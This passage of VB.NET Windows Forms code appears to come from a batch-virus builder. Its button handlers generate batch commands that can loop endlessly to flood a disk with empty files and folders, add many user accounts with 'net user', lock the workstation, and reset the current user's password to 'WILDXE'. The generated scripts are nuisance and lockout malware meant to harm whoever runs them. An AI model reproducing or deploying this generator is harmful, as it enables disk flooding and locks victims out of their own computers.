            TextBox5.Text = "eg: C:\Program Files\"
            CheckBox8.Checked = False
        Else
            TextBox5.Enabled = False
        End If
    End Sub

    Private Sub Button50_Click(sender As Object, e As EventArgs) Handles Button50.Click
        If CheckedListBox5.GetItemChecked(CheckedListBox5.Items.IndexOf("Files")) Then
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + ":WX3"
            End If
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Add Files"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "nul >> %random%"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + "goto WX3"
            End If
        End If
        If CheckedListBox5.GetItemChecked(CheckedListBox5.Items.IndexOf("Folder")) Then
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + ":WX3"
            End If
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Add Folders"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + "goto WX3"
            End If
        End If
        If CheckedListBox5.GetItemChecked(CheckedListBox5.Items.IndexOf("Users")) Then
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + ":WX3"
            End If
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Add Users"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "net user %radnom% /add"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            If CheckBox5.Checked = True Then
                RichTextBox1.Text += Environment.NewLine + "goto WX3"
            End If
        End If
    End Sub

    Private Sub CheckedListBox5_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox5.SelectedIndexChanged
        Dim idx, sidx As Integer
        sidx = CheckedListBox5.SelectedIndex
        For idx = 0 To CheckedListBox5.Items.Count - 1
            If idx <> sidx Then
                CheckedListBox5.SetItemChecked(idx, False)
            Else
                CheckedListBox5.SetItemChecked(sidx, True)
            End If
        Next
    End Sub

    Private Sub Button51_Click(sender As Object, e As EventArgs) Handles Button51.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Lock Computer"
        RichTextBox1.Text += Environment.NewLine + "rundll32 user32.dll,LockWorkStation"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If RichTextBox1.Text = "@echo off" Then
            RichTextBox1.Text += Environment.NewLine + ""
        Else
            RichTextBox1.Text = "@echo off"
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Change User Password To WILDXE"
        RichTextBox1.Text += Environment.NewLine + "net user %username% WILDXE"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub
End Class



